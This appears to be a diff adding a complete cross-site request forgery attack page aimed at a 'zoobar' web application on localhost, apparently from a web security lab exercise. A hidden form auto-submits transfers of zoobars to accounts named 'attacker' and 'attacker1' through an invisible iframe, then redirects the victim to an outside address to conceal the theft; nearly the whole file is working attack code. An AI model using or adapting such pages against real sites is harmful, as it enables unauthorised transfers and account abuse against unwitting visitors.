@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<title>Page Title</title>
+</head>
+<body>
+
+<form method = "POST" style="display:none" name="transferform"id = "transferform" action = "http://localhost:8080/zoobar/index.cgi/transfer" target = "frame">
+<input name="zoobars" type="text" value="1"/>
+<input name="recipient" type="text" value="attacker"/>
+<input type="text" value="Send" name="submission"/>
+</form>
+
+<iframe style="visibility: hidden ; height: 0; width: 0; position: absolute " id="frame" ></iframe>
+
+<script>
+ var x = 1;
+ document.getElementById('frame').onload = function () {
+         if(x == 1)
+        {
+            document.transferform.getElementsByTagName('input')[1].value = "attacker1";
+            document.transferform.getElementsByTagName('input')[0].value = "9";
+            x = 2;            
+            document.getElementById("transferform").submit();
+        }
+        else
+            window.location = "http://192.168.56.4:12345/";
+        }
+
+ document.getElementById("transferform").submit();
+</script>
+</body>
+</html>
